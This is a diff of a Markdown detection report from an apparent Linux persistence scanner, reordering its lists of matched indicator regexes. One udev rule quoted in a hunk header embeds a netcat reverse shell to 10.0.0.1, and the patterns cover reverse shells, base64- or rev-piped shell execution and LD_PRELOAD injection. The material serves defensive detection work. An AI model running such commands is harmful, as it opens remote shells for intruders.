@@ -15,8 +15,8 @@ ACTION=="add", ENV{CMD}="nc -e /bin/bash 10.0.0.1 4444", RUN+="/bin/sh -c 'eval 
 ```
 
 **Matched Indicators (`rules.json`):**
-* `eval\s+(\$env|%E)\{` — **MEDIUM** (*Udev macro substitution evasion attempt detected in extracted payload*)
 * `\bnc\s+-e` — **CRITICAL** (*Reverse shell attempt using netcat with execution flag*)
+* `eval\s+(\$env|%E)\{` — **MEDIUM** (*Udev macro substitution evasion attempt detected in extracted payload*)
 
 **PoC Evidence:**
 
@@ -45,10 +45,12 @@ WantedBy=multi-user.target
 ```
 
 **Matched Indicators (`rules.json`):**
+* `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*) - *Triggered via ExecStart field*
+* `base(64|32)\s+(-d|--decode)\s*\|\s*(ba|z|k|da)?sh` — **CRITICAL** (*Base64/32 decoding invocation piped directly into a shell interpreter.*) - *Triggered via ExecStart field*
 * `LD_PRELOAD` — **CRITICAL** (*Shared library preloading injection*) - *Triggered via Environment field*
 * `(/tmp|/dev/shm|/var/tmp|/run/user)/\.[a-zA-Z0-9_-]+` — **HIGH** (*Direct execution of hidden script or binary from non-standard temporary directories.*) - *Triggered via Environment field*
-* `base(64|32)\s+(-d|--decode)\s*\|\s*(ba|z|k|da)?sh` — **CRITICAL** (*Base64/32 decoding invocation piped directly into a shell interpreter.*) - *Triggered via ExecStart field*
-* `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*) - *Triggered via ExecStart field*
+
+
 
 **PoC Evidence:**
 
@@ -67,8 +69,9 @@ WantedBy=multi-user.target
 ```
 
 **Matched Indicators (`rules.json`):**
-* `rev\s*\|\s*(ba|z|k|da)?sh` — **CRITICAL** (*Reversed command string piped directly into a shell interpreter.*)
 * `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*)
+* `rev\s*\|\s*(ba|z|k|da)?sh` — **CRITICAL** (*Reversed command string piped directly into a shell interpreter.*)
+
 
 **PoC Evidence:**
 
